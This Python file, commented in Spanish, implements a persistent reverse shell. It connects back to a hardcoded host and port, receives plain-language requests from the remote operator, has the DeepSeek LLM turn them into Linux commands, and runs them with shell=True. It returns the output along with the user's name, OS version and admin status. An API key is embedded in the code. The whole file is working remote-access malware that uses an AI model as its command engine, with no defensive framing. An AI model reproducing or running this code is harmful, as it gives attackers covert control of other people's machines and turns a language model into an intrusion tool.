import socket
import subprocess
import time
import re
import os
import platform
from openai import OpenAI

# =========================
# CONFIGURACIÓN SEGURA
# =========================
DEEPSEEK_API_KEY = 'sk-7a2d8c44nd8jdk38gk4c9f2b4a6d8e0c'  # Usar la clave real
HOST = os.getenv('RSHELL_HOST', '192.168.36.41')
PORT = int(os.getenv('RSHELL_PORT', 62065))
RECONNECT_DELAY = int(os.getenv('RSHELL_RECONNECT', 15))
SOCKET_TIMEOUT = int(os.getenv('RSHELL_TIMEOUT', 60))
MAX_HISTORY = int(os.getenv('RSHELL_MAX_HISTORY', 20))
CONTEXT_PATH = os.getenv('RSHELL_CONTEXT', 'context.md')

# =========================
# DETECCIÓN DE SISTEMA OPERATIVO
# =========================
SO = platform.system().lower()  # 'windows', 'linux', 'darwin' (macOS)

# Importaciones condicionales
if SO == 'windows':
    import getpass
    import ctypes
    # Otros módulos específicos de Windows
elif SO == 'darwin':
    import getpass
    # Otros módulos específicos de Mac
elif SO == 'linux':
    import getpass
    # Otros módulos específicos de Linux

# =========================
# CLIENTE DEEPSEEK
# =========================
client = OpenAI(api_key=DEEPSEEK_API_KEY, base_url="https://api.deepseek.com")

# =========================
# HISTORIAL DE MENSAJES
# =========================
def cargar_contexto(path):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        print(f"[ERROR] No se pudo leer el contexto: {e}")
        return "Eres un asistente de ciberseguridad."

messages = [
    {"role": "system", "content": cargar_contexto(CONTEXT_PATH)}
]

def agregar_al_historial(msg):
    messages.append(msg)
    if len(messages) > MAX_HISTORY:
        messages.pop(1)  # Mantén el mensaje system y los últimos N

# =========================
# FUNCIONES DE DIAGNÓSTICO POR SISTEMA
# =========================
def info_windows():
    try:
        usuario = getpass.getuser()
        version = platform.platform()
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            is_admin = False
        return f"[Windows]\nUsuario: {usuario}\nVersión: {version}\nAdmin: {is_admin}"
    except Exception as e:
        return f"[Windows] Error al obtener información: {e}"

def info_mac():
    try:
        usuario = getpass.getuser()
        version = platform.platform()
        return f"[MacOS]\nUsuario: {usuario}\nVersión: {version}"
    except Exception as e:
        return f"[MacOS] Error al obtener información: {e}"

def info_linux():
    try:
        usuario = getpass.getuser()
        version = platform.platform()
        return f"[Linux]\nUsuario: {usuario}\nVersión: {version}"
    except Exception as e:
        return f"[Linux] Error al obtener información: {e}"

def info_sistema():
    if SO == 'windows':
        return info_windows()
    elif SO == 'darwin':
        return info_mac()
    elif SO == 'linux':
        return info_linux()
    else:
        return "Sistema operativo no soportado."

# =========================
# GENERACIÓN DE COMANDOS
# =========================
def generar_comando(consulta):
    try:
        agregar_al_historial({"role": "user", "content": (
            f"Genera un comando Linux para: '{consulta}'. "
            "Formato: solo el comando entre || (ej: ||ls -la 2>/dev/null||)"
        )})

        response = client.chat.completions.create(
            model="deepseek-chat",
            messages=messages,
            temperature=0.7,
            max_tokens=128,
            stream=False
        )

        respuesta_text = response.choices[0].message.content
        comando = re.search(r'\|\|(.*?)\|\|', respuesta_text, re.DOTALL)

        if comando and ('base64' not in respuesta_text.lower() or 'base64' in consulta.lower()):
            agregar_al_historial({"role": "assistant", "content": respuesta_text})
            return comando.group(1).strip()
        else:
            agregar_al_historial({"role": "assistant", "content": "||echo 'ERROR: Respuesta inválida o contiene base64'||"})
            return "echo 'ERROR: Respuesta inválida o contiene base64'"
    except Exception as e:
        agregar_al_historial({"role": "assistant", "content": f"||echo 'Error crítico: {str(e)}'||"})
        return f"echo 'Error crítico: {str(e)}'"

# =========================
# CONEXIÓN Y SHELL PRINCIPAL
# =========================
def conexion_segura():
    while True:
        try:
            s = socket.socket()
            s.settimeout(SOCKET_TIMEOUT)
            s.connect((HOST, PORT))
            return s
        except Exception as e:
            print(f"\033[91m[!] Error de conexión: {str(e)} - Reconectando en {RECONNECT_DELAY}s...\033[0m")
            time.sleep(RECONNECT_DELAY)

def shell():
    while True:
        sock = None
        try:
            sock = conexion_segura()
            print("\033[92m[+] Conexión establecida con el servidor\033[0m")
            while True:
                consulta = sock.recv(8192).decode(errors='ignore').strip()
                if not consulta or consulta.lower() in ['exit', 'quit']:
                    break

                output = ""
                if consulta.lower() == "diagnostico":
                    output = f"TEXT:\n[Consulta] {consulta}\n[Comando] info_sistema()\n[Salida]\n{info_sistema()}"
                elif consulta.lower().startswith("que te habia dicho"):
                    consultas_previas = [
                        msg["content"].split("Genera un comando Linux para: '")[1].split("'.")[0]
                        for msg in messages if msg["role"] == "user"
                    ]
                    if consultas_previas:
                        output = f"TEXT:\n[Consulta] {consulta}\n[Comando] echo 'Mostrando consultas previas'\n[Salida]\n" + "\n".join(consultas_previas)
                    else:
                        output = f"TEXT:\n[Consulta] {consulta}\n[Comando] echo 'Mostrando consultas previas'\n[Salida]\nNo hay consultas previas."
                else:
                    comando = generar_comando(consulta)
                    resultado = subprocess.run(
                        comando,
                        shell=True,
                        capture_output=True,
                        text=True
                    )
                    salida = resultado.stdout.strip() or resultado.stderr.strip()
                    output = f"TEXT:\n[Consulta] {consulta}\n[Comando] {comando}\n[Salida]\n{salida}"

                sock.sendall(output.encode())
        except KeyboardInterrupt:
            print("\n\033[93m[!] Interrupción recibida, cerrando...\033[0m")
            break
        except Exception as e:
            print(f"\033[91m[ERROR] {str(e)} - Reconectando en {RECONNECT_DELAY}s...\033[0m")
            time.sleep(RECONNECT_DELAY)
        finally:
            if sock:
                sock.close()
                print("\033[94m[+] Conexión cerrada correctamente\033[0m")

if __name__ == "__main__":
    shell() 
